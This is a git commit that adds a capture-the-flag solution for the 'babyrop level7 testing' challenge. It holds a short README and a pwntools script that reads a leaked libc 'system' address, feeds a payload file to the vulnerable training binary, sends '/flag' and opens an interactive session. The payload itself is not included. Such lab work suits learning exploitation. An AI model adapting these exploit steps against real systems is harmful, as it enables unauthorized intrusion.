f5dd346f3bc80ca587183eeb21586c7669a0ab7f
programmer-k <programmer-j@naver.com>
2022-01-20 16:22:47 +0000

    Add a solution for babyrop level7 testing.

---
+++ babyrop/level7/testing/README.md
@@ -0,0 +1,2 @@
+`libc` library is identical with the teaching challenge, so we can utilize what we have found before.
+Please refer to the teaching challenge for more information.
---
+++ babyrop/level7/testing/run.py
@@ -0,0 +1,19 @@
+#!/usr/bin/env python3
+
+import pwn
+
+# Create a process
+#binary = pwn.process(['strace', '/babyrop_level7_testing1'])  # Debugging purpose
+binary = pwn.process(['/babyrop_level7_testing1'])
+
+# Receive lines
+print(binary.recvline_contains(b"[LEAK] The address of \"system\" in libc is: 0x"))
+input('Press [Enter] to continue..')
+
+# First input
+with open("payload", "rb") as f:
+    binary.sendline(f.read())
+
+# Second input
+binary.sendline(b"/flag")
+binary.interactive()
